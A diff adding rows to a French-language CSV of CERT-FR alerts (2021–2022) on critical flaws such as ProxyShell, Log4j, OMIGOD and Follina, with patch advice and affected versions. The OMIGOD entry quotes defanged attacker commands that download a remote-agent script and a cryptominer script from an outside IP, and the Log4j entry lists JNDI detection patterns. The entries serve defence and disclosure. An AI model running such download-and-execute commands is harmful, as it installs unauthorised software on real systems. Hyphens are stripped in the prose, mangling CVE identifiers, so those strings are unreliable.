+prendre le contrôle d'un serveur Microsoft Exchange. La technique,
+dénommée ""ProxyShell"" s'appuie sur l'existence de plusieurs
+vulnérabilités corrigées en avril et en mai 2021
+[\[4\]](/avis/CERTFR2021AVI369/) (mais
+annoncées en juillet)
+[\[2\]](/avis/CERTFR2021AVI522/)
+[\[3\]](/actualite/CERTFR2021ACT030/).
+
+Récemment, le CERTFR a pris connaissance d'activités malveillantes qui
+pourraientêtre basées sur une exploitation de ces vulnérabilités et
+ciblant les serveurs Microsoft Exchange d'entités françaises.
+
+Le CERTFR a signalé l'existence de serveurs vulnérables exposés sur
+Internet à leurs propriétaires, mais sans possibilité d'exhaustivité.
+Par conséquent le CERTFR rappelle les recommandations suivantes :
+
+   appliquer immédiatement les correctifs de sécurité fournis par
+    l’éditeur sur l’ensemble des serveurs Exchange vulnérables exposés
+    sur Internet puis en interne ;
+   procéder à l’analyse des serveurs Exchange afin d’identifier une
+    possible activité anormale à l'aide des informations fournies dans
+    notre bulletin CERTFR2021ACT035 et la présence de webshells ;
+   en cas de compromission, contrôler le système d’information pour
+    détecter d’éventuelles latéralisations ainsi qu’une c",2021-08-27T02:00:00.000000,
+CERTFR-2021-ALE-018,Vulnérabilité dans Atlassian Confluence Server et Data Center,2022-01-05,CVE-2021-26084,Exécution de code arbitraire à distance,"Le 25 août 2021, Atlassian a publié un avis de sécurité alertant de
+l'existence d'une vulnérabilité affectant la solution de travail
+collaboratif Confluence, référencée CVE202126084.
+
+L'éditeur, ainsi que plusieurs autres sources, indiquent que la
+vulnérabilité CVE202126084, qui permet à un attaquant non authentifié
+d'exécuter du code arbitraire à distance, est activement exploitée. Le 3
+septembre 2021, l'éditeur confirme par ailleurs que toutes les versions
+citées cidessus sont vulnérables, quelles que soient leurs
+configurations.
+
+Le CERTFR a également connaissance de campagnes d'identification de
+serveurs Confluence exposés sur Internet. De plus, des codes
+d'exploitation sont disponibles publiquement pour cette vulnérabilité.",2021-09-06T02:00:00.000000,Atlassian Confluence – Atlassian Confluence Server et Data Center versions 7.12.x antérieures à 7.12.5 | Atlassian Confluence – Atlassian Confluence Server et Data Center versions antérieures à 6.13.23 | Atlassian Confluence – Atlassian Confluence Server et Data Center versions 7.5.x à 7.11.x antérieures à 7.11.6 | Atlassian Confluence – Atlassian Confluence Server et Data Center versions 6.14.x à 7.4.x antérieures à 7.4.11
+CERTFR-2021-ALE-019,[MaJ] Vulnérabilité dans Microsoft Windows,2022-05-04,CVE-2021-40444,Exécution de code arbitraire à distance,"\[Version du 15 septembre 2021\] Dans le cadre de son Patch
+Tuesday, en date du 14 septembre 2021, Microsoft a mis à disposition un
+correctif pour cette vulnérabilité. Le CERTFR recommande fortement
+d'appliquer ce correctif et, le cas échéant, d'enlever les
+contournements préalablement appliqués pour se protéger de cette
+vulnérabilité.
+
+\[Version initiale\]
+
+Celleci affecte le composant MSHTML utilisé par ActiveX. Un attaquant
+peut obtenir une exécution de code arbitraire à distance en envoyant un
+fichier Office piégé.
+
+Cette exécution de code s'effectue avec les niveaux de privilèges de
+l'utilisateur ayant ouvert le document.
+
+Aucun correctif n'est disponible.
+
+Microsoft indique également que cette vulnérabilité est activement
+exploitée dans le cadre d'attaques ciblées.",2021-09-08T02:00:00.000000,"Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows 10 Version 20H2 pour systèmes x64 | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 (Server Core installation) | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows Server, version 2004 (Server Core installation) | Microsoft Windows – Windows 8.1 pour systèmes x64 | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 | Microsoft Windows – Windows 10 Version 2004 pour systèmes x64 | Microsoft Windows – Windows Server 2022 | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 | Microsoft Windows – Windows 10 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 2004 pour systèmes 32 bits | Microsoft Windows – Windows 7 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 pour systèmes ARM64 | Microsoft Windows – Windows 10 Version 2004 pour systèmes ARM64 | Microsoft Windows – Windows 10 Version 1809 pour systèmes x64 | Microsoft Windows – Windows 8.1 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 1909 pour systèmes ARM64 | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows Server 2012 (Server Core installation) | Microsoft Windows – Windows 10 Version 1607 pour systèmes 32 bits | Microsoft Windows – Windows Server 2022 (Server Core installation) | Microsoft Windows – Windows 10 Version 1909 pour systèmes 32 bits | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 7 pour systèmes 32 bits Service Pack 1 | Microsoft Windows – Windows 10 Version 21H1 pour systèmes ARM64 | Microsoft Windows – Windows 10 pour systèmes x64 | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows 10 Version 21H1 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 20H2 pour systèmes 32 bits | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1909 pour systèmes x64 | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 21H1 pour systèmes x64 | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1809 pour systèmes ARM64 | Microsoft Windows – Windows 10 Version 1607 pour systèmes x64 | Microsoft Windows – Windows 10 Version 1809 pour systèmes 32 bits"
+CERTFR-2021-ALE-020,[Maj] Multiples vulnérabilités dans Microsoft Azure Open Management Infrastructure,2022-01-05,CVE-2021-38648; CVE-2021-38647; CVE-2021-38645; CVE-2021-38649,Élévation de privilèges; Exécution de code arbitraire à distance,"\[Version du 20 septembre 2021\]
+
+Le 18 septembre Microsoft a publié
+un article afin d'expliquer comment Azure Sentinel peut aider à la
+recherche d'une compromission notamment l'exploitation des
+vulnérabilités OMIGOD \[4\]. De plus, à cette occasion, les marqueurs
+suivants, qui correspondent à des traces liées à une tentative
+d'exploitation, ont été proposés par Microsoft : 
+
+   wget
+    https://www\[.\]dwservice\[.\]net/download/dwagentgeneric\[.\]sh 
+    O dwagentgeneric.sh
+   echo curl
+    https://www\[.\]dwservice\[.\]net/download/dwagentgeneric\[.\]sh 
+    output dw.sh \ go.sh
+   curl fSsL
+    http://104\[.\]168\[.\]213\[.\]31:55879/coinlinux/runMiner\[.\]sh
+
+\[Version initiale\]
+
+Le 14 septembre 2021, une équipe de chercheurs en vulnérabilités a
+découvert quatre vulnérabilités dans Microsoft Azure, la plateforme
+cloud de Microsoft \[1\]. Ces vulnérabilités sont situées au sein du
+service OMI, lequel est déployé dans l'écosystème Azure. Ces
+vulnérabilités ont été regroupées sous l’appellation de « OMIGOD ». Le
+service OMI est le pendant opensource pour la famille de systèmes
+d'exploitation de type Linux ou Unix de WMI (Windows Management
+Infrastructure) et permet la gestion des configurations dans des
+environnements distants et locaux.
+
+ 
+
+En particulier, la vulnérabilité immatriculée CVE202138647 permet à un
+attaquant non authentifié de réaliser une exécution de code arbitraire
+avec les privilèges de l'utilisateur root. Elle impacte uniquement les
+entités utilisant les ",2021-09-17T02:00:00.000000,"Microsoft Azure – Azure Automation State Configuration, DSC Extension (Cloud) DSC Agent versions 3.0.0.1 antérieures à 3.0.0.3 | Microsoft Azure – Azure Automation State Configuration, DSC Extension (Cloud) DSC Agent versions 2.71.X.XX antérieures à 2.71.1.25 | Microsoft Azure – Azure Automation State Configuration, DSC Extension (Cloud) DSC Agent versions 2.0.0.0 | Microsoft Azure – System Center Operations Manager (SCOM) On-Premises OMI versions antérieures à v1.6.8-1 (OMI framework est utilisé pour la surveillance de Linux / Unix) | Microsoft Azure – Container Monitoring Solution (Cloud) déployé avec une image docker ayant un SHA ID différent de 12b7682d8f9a2f67752bf121029e315abcae89bc0c34a0e05f07baec72280707 | Microsoft Azure – Azure Diagnostics (LAD) (Cloud) versions 3.0.131 et antérieures | Microsoft Azure – Azure Automation State Configuration, DSC Extension (On-Premises) OMI versions antérieures à v1.6.8-1 (OMI framework est un pré-requis pour installer pour l'agent DSC ) | Microsoft Azure – Azure Automation State Configuration, DSC Extension (Cloud) DSC Agent versions 2.70.X.XX antérieures à 2.70.0.30 | Microsoft Azure – Azure Automation (On-Premises et Cloud) OMS Agent pour Linux GA versions v1.13.35 et antérieures | Microsoft Azure – Azure Diagnostics (LAD) (Cloud) versions 4.0.0 à 4.0.5 antérieures à 4.0.11 | Microsoft Azure – Azure Security Center (Cloud) OMS Agent pour Linux GA versions v1.13.35 et antérieures | Microsoft Azure – le paquet OMI (On-Premises et Cloud) versions antérieures à v1.6.8-1 | Microsoft Azure – Azure Automation Update Management (On-Premises et Cloud) OMS Agent pour Linux GA versions v1.13.35 et antérieures | Microsoft Azure – Log Analytics Agent (On-Premises et Cloud) OMS Agent pour Linux GA versions 1.13.35 et antérieures"
+CERTFR-2021-ALE-021,Vulnérabilité dans Microsoft Exchange,2022-05-04,CVE-2021-42321,Exécution de code arbitraire à distance,"Une vulnérabilité a été découverte dans Microsoft Exchange, initialement
+dans le cadre de la compétition de cybersécurité Tianfu Cup qui a eu
+lieu en juillet 2021. Elle permet à un attaquant ayant accès aux
+identifiants d'un utilisateur de provoquer une exécution de code
+arbitraire à distance, permettant d’obtenir in fine les droits de
+l’administrateur de domaine Active Directory.
+
+L'éditeur confirme que cette vulnérabilité est exploitée dans le
+cadre d'attaques ciblées.
+
+Le CERTFR recommande donc d'appliquer les correctifs de sécurité dans
+les plus brefs délais.
+
+Le CERTFR rappelle en outre que l'éditeur ne fournit des correctifs de
+sécurité que pour les deux dernières mises à jour cumulatives
+(Cumulative Update, CU). En l’occurrence, seules les versions de
+Microsoft Exchange 2019 CU 11, 2019 CU 10, 2016 CU 22 et 2016 CU 21
+disposent d'un correctif de sécurité. Il est donc primordial d'avoir
+déployé ces mises à jour cumulatives (CU) et d'appliquer le
+correctif.
+
+Enfin, il convient de souligner que ce type de service ne devrait pas
+être exposé sur Internet sans mesure de protection \[1\].",2021-11-10T01:00:00.000000,Microsoft N/A – Microsoft Exchange 2016 | Microsoft N/A – Microsoft Exchange 2019
+CERTFR-2021-ALE-022,[MaJ] Vulnérabilité dans Apache Log4j,2022-05-04,CVE-2021-4104; CVE-2021-44832; CVE-2021-45105; CVE-2021-45046; CVE-2021-44228,Exécution de code arbitraire à distance,"Une vulnérabilité a été découverte dans la bibliothèque de
+journalisation Apache log4j. Cette bibliothèque est très souvent
+utilisée dans les projets de développement d'application Java/J2EE ainsi
+que par les éditeurs de solutions logicielles sur étagère basées sur
+Java/J2EE.
+
+Cette vulnérabilité permet à un attaquant de provoquer une exécution de
+code arbitraire à distance s'il a la capacité de soumettre une donnée à
+une application qui utilise la bibliothèque log4j pour journaliser
+l'évènement. Cette attaque peut être réalisée sans être authentifié, par
+exemple en tirant parti d'une page d'authentification qui journalise les
+erreurs d'authentification.
+
+Des preuves de concept ont déjà été publiées. Cette vulnérabilité fait
+désormais l'objet d'une exploitation active.
+
+
+
+
+
+
+
+
+
+
+
+
+
+ Détection
+
+
+
+
+
+Le CERTFR recommande de réaliser une analyse approfondie des journaux
+réseau. Les motifs suivants permettent d'identifier une tentative
+d'exploitation de cette vulnérabilité lorsqu'ils sont utilisés dans les
+URLs ou certaines entêtes HTTP comme useragent :
+
+
+
+ 
+
+ 
+
+ 
+
+ \${jndi:
+
+ 
+
+ 
+
+ 
+
+ \$%7Bjndi:     (prend en compte un obscurcissement simple)
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+Cependant, les attaquants peuvent utiliser des moyens d’obscurcissement
+pour contourner les motifs de détection précédents. Les motifs suivants
+permettent de prendre en compte certaines méthodes d'obscurcissement
+mais peuvent provoquer des faux positifs :  
+
+
+
+
+
+
+ 
+
+ 
+
+ \${\${
+
+ 
+
+ 
+
+ 
+
+  class=""mxEventTilebody"" dir=""auto""\${",2021-12-10T01:00:00.000000,"Apache N/A – Apache Log4j versions 2.0 à 2.14.1 | Apache N/A – Apache Log4j versions 1.x (versions obsolètes) sous réserve d'une configuration particulière, cf. ci-dessous | Apache N/A – Apache Log4j version 2.15.0 | Apache N/A – Les produits utilisant une version vulnérable de Apache Log4j : les CERT nationaux européens tiennent à jour une liste complète des produits et de leur statut vis-à-vis de la vulnérabilité [2] | Apache N/A – Apache Log4j versions 2.16.0 et 2.12.2 (java 7)"
+CERTFR-2022-ALE-001,[MaJ] Vulnérabilité dans Microsoft Windows,2022-05-04,CVE-2022-21907,Exécution de code arbitraire à distance,"\[Version du 18 janvier 2022\]
+
+Le 17 janvier 2022, l'éditeur a publié une mise à jour
+exceptionnelle afin de corriger plusieurs
+dysfonctionnements importants pouvant être rencontrés lors de
+l'installation des mises à jour liés au Patch
+Tuesday de janvier \[1\]. Ces mises à jour sont accessibles
+directement sur le catalogue Microsoft Update.
+
+\[Version initiale\]
+
+Le système d'exploitation Microsoft Windows propose un service de
+gestion des requêtes HTTP sous la forme d'un pilote en mode noyau appelé
+http.sys. Une vulnérabilité a été découverte dans ce pilote pour
+Windows Server 2019, Windows Server 2022, Windows 10 et Windows 11. Elle
+permet à un attaquant de provoquer une exécution de code arbitraire à
+distance et l'éditeur considère qu'elle peut être exploitée dans le
+cadre d'attaques à propagation de type ""ver informatique"".
+
+Pour rappel, le pilote http.sys est notamment utilisé par Microsoft
+IIS, le service Windows Remote Management (WinRM) ainsi que le service
+SSDP. Il est donc présent sur les serveurs mais également sur les postes
+de travail. Par conséquent, le CERTFR recommande de considérer que
+l'ensemble des machines utilisant une version de Windows affectée est
+vulnérable.
+
+D'après Microsoft, les environnements Windows Server 2019 et Windows 10
+version 1809 ne sont pas vulnérables par défaut, sauf si la clé de
+registre suivante est configurée de cette manière :
+
+HKEYLOCALMACHINE\System\CurrentControlSet\Services\HTTP\Parameters\ ""EnableTrailerSupport""=dword:0000000",2022-01-12T01:00:00.000000,"Microsoft Windows – Windows 10 Version 21H2 pour systèmes 32 bits | Microsoft Windows – Windows Server 2022 (Server Core installation) | Microsoft Windows – Windows 10 Version 1809 pour systèmes x64 | Microsoft Windows – Windows 10 Version 21H2 pour systèmes ARM 64 bits | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows 10 Version 20H2 pour systèmes x64 | Microsoft Windows – Windows 10 Version 20H2 pour systèmes ARM 64 bits | Microsoft Windows – Windows 10 Version 21H1 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 20H2 pour systèmes 32 bits | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 21H1 pour systèmes x64 | Microsoft Windows – Windows 10 Version 21H2 pour systèmes x64 | Microsoft Windows – Windows 10 Version 21H1 pour systèmes ARM 64 bits | Microsoft Windows – Windows 10 Version 1809 pour systèmes ARM 64 bits | Microsoft Windows – Windows 11 pour systèmes ARM 64 bits | Microsoft Windows – Windows Server 2022 | Microsoft Windows – Windows 10 Version 1809 pour systèmes 32 bits | Microsoft Windows – Windows 11 pour systèmes x64"
+CERTFR-2022-ALE-002,Vulnérabilité dans VMware Spring Cloud Gateway,2022-10-07,CVE-2022-22947,Exécution de code arbitraire à distance,"Une vulnérabilité a été découverte dans VMware Spring Cloud Gateway.
+Elle permet à un attaquant de forger une requête malveillante
+spécialement conçue afin de provoquer une exécution de code arbitraire à
+distance.
+
+Les applications utilisant Spring Cloud Gateway sont vulnérables à une
+attaque par injection de code lorsque le point de terminaison
+(endpoint) Gateway Actuator est activé, exposé et non sécurisé. Il est
+défini par la route par défaut /actuator/gateway.
+
+Des preuves de concept sont actuellement disponibles sur internet.",2022-03-03T01:00:00.000000,Spring N/A – Spring Cloud Gateway versions 3.1.x antérieures à 3.1.1 | Spring N/A – Spring Cloud Gateway versions 3.0.x antérieures à 3.0.7
+CERTFR-2022-ALE-003,[MàJ] Vulnérabilité dans l'implémentation du protocole RPC par Microsoft,2022-05-04,CVE-2022-26809,Exécution de code arbitraire à distance,"\[mise à jour du 15 avril
+2022\]
+
+Une vulnérabilité a été découverte dans l'implémentation Microsoft du
+protocole RPC  Remote Procedure Call   protocole permettant
+d'effectuer des appels de procédures sur des machines distantes. Elle
+permet à un attaquant de provoquer une exécution de code arbitraire à
+distance. En particulier, cette vulnérabilité affecte le protocole
+SMB  Server Message Block  qui permet notamment le partage de
+ressources comme les fichiers ou les imprimantes.
+
+Le CERTFR recommande d'appliquer la mise à jour dans les plus brefs
+délais, en priorité sur les systèmes les plus critiques (notamment les
+contrôleurs de domaine Active Directory). Au vu de la criticité de
+cette vulnérabilité, l'éditeur a publié des correctifs de sécurité pour
+des systèmes qui ne sont plus supportés (en particulier, Windows 7 et
+Windows Server 2008 R2).
+
+Il est également requis de procéder à une revue des règles de filtrage
+afin de s'assurer du respect des bonnes pratiques de sécurisation des
+environnements Microsoft (notamment \[1\], \[2\], \[3\]).",2022-04-13T02:00:00.000000,"Microsoft Windows – Windows 11 for x64-based Systems | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 11 for ARM64-based Systems | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 7 for 32-bit Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 1607 for x64-based Systems | Microsoft Windows – Windows 10 Version 21H2 for x64-based Systems | Microsoft Windows – Windows 8.1 for 32-bit systems | Microsoft Windows – Windows 10 Version 1909 for x64-based Systems | Microsoft Windows – Windows 10 for x64-based Systems | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1909 for ARM64-based Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 20H2 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 1607 for 32-bit Systems | Microsoft Windows – Windows 10 Version 1809 for 32-bit Systems | Microsoft Windows – Windows 10 Version 1909 for 32-bit Systems | Microsoft Windows – Windows 8.1 for x64-based systems | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows Server 2012 (Server Core installation) | Microsoft Windows – Windows Server 2022 (Server Core installation) | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows 10 Version 21H2 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 21H1 for 32-bit Systems | Microsoft Windows – Windows 10 Version 21H2 for 32-bit Systems | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows 10 Version 1809 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 20H2 for x64-based Systems | Microsoft Windows – Windows 7 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for 32-bit Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 | Microsoft Windows – Windows 10 for 32-bit Systems | Microsoft Windows – Windows 10 Version 1809 for x64-based Systems | Microsoft Windows – Windows 10 Version 21H1 for ARM64-based Systems | Microsoft Windows – Windows Server 2022 | Microsoft Windows – Windows 10 Version 21H1 for x64-based Systems"
+CERTFR-2022-ALE-004,Vulnérabilité dans F5 BIG-IP,2022-09-16,CVE-2022-1388,Exécution de code arbitraire à distance; Atteinte à l'intégrité des données; Atteinte à la confidentialité des données,"La vulnérabilité
+[CVE20221388](https://www.cve.org/CVERecord?id=20221388) affectant
+les équipements BIGIP de F5 Networks a été annoncée le 4 mai 2022. Elle
+permet de contourner le mécanisme d’authentification et d’invoquer les
+fonctions d’interprétation de commandes systèmes disponibles au travers
+de l’interface de programmation (API) iControl. Il est en particulier
+possible d’invoquer une invite de commande (bash) qui sera exécutée
+avec les droits root, permettant donc de prendre le contrôle de
+l’équipement.
+
+L’API iControl REST permet l’automatisation de certaines tâches
+d’administration. Elle est accessible depuis l’interface
+d’administration de l’équipement mais également depuis les adresses IP
+dénommées selfIP qui peuvent être configurées via le menu Network
+/ SelfIPs dans les différents VLANs auxquels ces équipements sont
+connectés.
+
+Le CERTFR recommande de ne pas exposer les interfaces et API
+d'administration sur Internet.
+
+Cette vulnérabilité a déjà été mentionnée dans le bulletin d’actualité
+hebdomadaire du 09 mai 2022. Toutefois, les analyses techniques publiées
+récemment confirment la facilité d’exploitation de cette vulnérabilité
+et des codes d’exploitation sont désormais disponibles. Par ailleurs,
+certaines versions affectées ne disposent pas de correctif et les
+possibilités d’une exploitation par l’intermédiaire d’un réseau interne
+ne peuvent pas être exclues.",2022-05-11T02:00:00.000000,F5 BIG-IP – F5 BIG-IP versions 15.x antérieures à 15.1.5.1 | F5 BIG-IP – F5 BIG-IP versions 14.x antérieures à 14.1.4.6 | F5 BIG-IP – F5 BIG-IP versions 16.x antérieures à 16.1.2.2 | F5 BIG-IP – F5 BIG-IP versions 13.x antérieures à 13.1.5
+CERTFR-2022-ALE-005,[MàJ] Vulnérabilité dans Microsoft Windows,2022-09-16,CVE-2022-30190,Exécution de code arbitraire à distance,"\[Mise à jour du 15 juin 2022\] Le mardi 14 juin 2022, l'éditeur a
+publié des mises à jour permettant la correction de cette
+vulnérabilité. 
+
+Le 27 mai 2022, un chercheur a identifié un document Word piégé sur la
+plateforme Virus Total. Lorsque ce document est ouvert, l'un des
+objets OLE (Object Linking and Embedding) présent dans celuici
+télécharge du contenu situé sur un serveur externe contrôlé par
+l'attaquant. Ce contenu exploite une vulnérabilité permettant d'exécuter
+du code malveillant via le binaire légitime [Microsoft Support
+Diagnostic Tool
+(MSDT)](https://docs.microsoft.com/frfr/windowsserver/administration/windowscommands/msdt),
+msdt.exe, sous la forme d'un script Powershell encodé en base 64. Il
+convient de noter que cette attaque fonctionne y compris lorsque les
+macros sont désactivées dans le document Office.
+
+Le 30 mai 2022, Microsoft a publié un avis de sécurité (cf. section
+Documentation) dans lequel l'éditeur confirme la vulnérabilité, qui
+porte l'identifiant CVE202230190, ainsi que les versions vulnérables
+du système d'exploitation Windows.
+
+Dans un billet de blogue du même jour (cf. section Documentation),
+Microsoft indique que si le fichier est ouvert par une application
+Office, le mode Protected View ou Application Guard for Office est
+enclenché et empêche la charge utile de s'exécuter.
+
+Toutefois, plusieurs chercheurs affirment que cette vulnérabilité peut
+être exploitée à l'aide d'un document au format RTF. Dans ce cas, la
+charge utile peut ainsi être",2022-05-31T02:00:00.000000,"Microsoft Windows – Windows 10 Version 21H1 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 20H2 pour systèmes x64 | Microsoft Windows – Windows 8.1 pour systèmes 32 bits | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 (Server Core installation) | Microsoft Windows – Windows Server 2016 | Microsoft Windows – Windows 10 Version 20H2 pour systèmes 32 bits | Microsoft Windows – Windows 11 pour systèmes x64 | Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows Server, version 20H2 (Server Core Installation) | Microsoft Windows – Windows 10 Version 21H1 pour systèmes x64 | Microsoft Windows – Windows 10 Version 1607 pour systèmes x64 | Microsoft Windows – Windows 11 pour systèmes ARM64 | Microsoft Windows – Windows 10 Version 21H1 pour systèmes ARM64 | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows Server 2012 (Server Core installation) | Microsoft Windows – Windows 10 Version 21H2 pour systèmes 32 bits | Microsoft Windows – Windows 10 Version 1607 pour systèmes 32 bits | Microsoft Windows – Windows Server 2022 (Server Core installation) | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 7 pour systèmes 32 bits Service Pack 1 | Microsoft Windows – Windows 10 Version 1809 pour systèmes x64 | Microsoft Windows – Windows 10 pour systèmes x64 | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2022 Azure Edition Core Hotpatch | Microsoft Windows – Windows 7 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows 10 Version 21H2 pour systèmes x64 | Microsoft Windows – Windows 10 Version 21H2 pour systèmes ARM64 | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 8.1 pour systèmes x64 | Microsoft Windows – Windows Server 2008 R2 pour systèmes x64 Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 pour systèmes ARM64 | Microsoft Windows – Windows 10 Version 1809 pour systèmes ARM64 | Microsoft Windows – Windows Server 2008 pour systèmes x64 Service Pack 2 | Microsoft Windows – Windows Server 2022 | Microsoft Windows – Windows Server 2008 pour systèmes 32 bits Service Pack 2 | Microsoft Windows – Windows 10 Version 1809 pour systèmes 32 bits | Microsoft Windows – Windows 10 pour systèmes 32 bits"
+CERTFR-2022-ALE-006,[MàJ] Vulnérabilité dans Atlassian Confluence,2022-10-07,CVE-2022-26134,Exécution de code arbitraire à distance,"\[Mise à jour du 03 juin 2022 à 19h52\] Atlassian a publié des
+correctifs.
+
+Une vulnérabilité a été découverte dans Atlassian Confluence. Elle
+permet à un attaquant non authentifié de provoquer une exécution de code
+arbitraire à distance.
+
+Cette vulnérabilité est actuellement exploitée de façon active par des
+attaquants qui semblent déployer différentes portes dérobées
+(webshells) pour maintenir leur présence sur les serveurs compromis.
+
+Cette alerte sera mise à jour régulièrement.",2022-06-03T02:00:00.000000,
+CERTFR-2022-ALE-007,Multiples vulnérabilités dans Microsoft Windows,2023-03-14,CVE-2022-34718; CVE-2022-34721; CVE-2022-34722,Exécution de code arbitraire à distance,"\[MàJ du 31 octobre 2022\]
+
+Une preuve de concept est publiquement disponible.
+
+\[Publication initiale\]
+
+Dans le cadre de son Patch Tuesday, en date du 13 septembre 2022,
+Microsoft a indiqué l'existence de multiples vulnérabilités au sein de
+plusieurs versions de Windows. Trois d'entre elles doivent faire l'objet
+d'une attention particulière car considérées comme critiques. Elles
+possèdent un score CVSSv3 de 9.8 et sont respectivement référencées par
+les numéros suivants : CVE202234718, CVE202234721 et CVE202234722.
+
+La vulnérabilité CVE202234718 permet à un attaquant non authentifié
+d'envoyer un paquet IPv6 spécialement conçu à destination d'un nœud
+Windows, provoquant une exécution de code arbitraire à distance.
+
+Les vulnérabilités CVE202234721 et CVE202234722 affectent les
+extensions du protocole Windows Internet Key Exchange (IKE). Elles
+permettent à un attaquant non authentifié de provoquer une exécution de
+code arbitraire à distance. D'après l'éditeur, bien que ces deux
+vulnérabilités n'affectent que le protocole IKEv1, tous les serveurs
+Windows seraient concernés car ils acceptent par défaut les paquets des
+versions 1 et 2.
+
+Par ailleurs, il est à noter que Microsoft a également mis à disposition
+des correctifs de sécurité pour des systèmes qui ne sont plus supportés
+(Windows 7 et Windows Server 2008R2).
+
+Le CERTFR a connaissance de références publiques mettant en exergue des
+travaux ayant potentiellement débouché sur l'élaboration d'un code
+d'exploitation pour l'une ",2022-09-16T02:00:00.000000,Microsoft Windows – Windows Server 2019 | Microsoft Windows – Windows 10 Version 21H1 for ARM64-based Systems | Microsoft Windows – Windows 10 Version 1809 for x64-based Systems | Microsoft Windows – Windows Server 2022 Azure Edition Core Hotpatch | Microsoft Windows – Windows 10 Version 20H2 for x64-based Systems | Microsoft Windows – Windows 10 Version 21H1 for x64-based Systems | Microsoft Windows – Windows 7 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for 32-bit Systems | Microsoft Windows – Windows 10 Version 21H2 for 32-bit Systems | Microsoft Windows – Windows 10 Version 21H2 for ARM64-based Systems | Microsoft Windows – Windows Server 2012 | Microsoft Windows – Windows Server 2012 R2 | Microsoft Windows – Windows Server 2012 (Server Core installation) | Microsoft Windows – Windows Server 2022 (Server Core installation) | Microsoft Windows – Windows Server 2016 (Server Core installation) | Microsoft Windows – Windows 8.1 for 32-bit systems | Microsoft Windows – Windows 10 Version 21H2 for x64-based Systems | Microsoft Windows – Windows 7 for 32-bit Systems Service Pack 1 | Microsoft Windows – Windows 11 for ARM64-based Systems | Microsoft Windows – Windows RT 8.1 | Microsoft Windows – Windows 8.1 for x64-based systems | Microsoft Windows – Windows Server 2019 (Server Core installation) | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 | Microsoft Windows – Windows Server 2012 R2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1607 for x64-based Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows 10 Version 1607 for 32-bit Systems | Microsoft Windows – Windows Server 2022 | Microsoft Windows – Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) | Microsoft Windows – Windows Server 2008 R2 for x64-based Systems Service Pack 1 | Microsoft Windows – Windows 10 Version 20H2 for ARM64-based Systems | Microsoft Windows – Windows 10 for 32-bit Systems | Microsoft Windows – Windows 10 Version 21H1 for 32-bit Systems | Microsoft Windows – Windows Server 2008 for 32-bit Systems Service Pack 2 | Microsoft Windows – Windows 10 Version 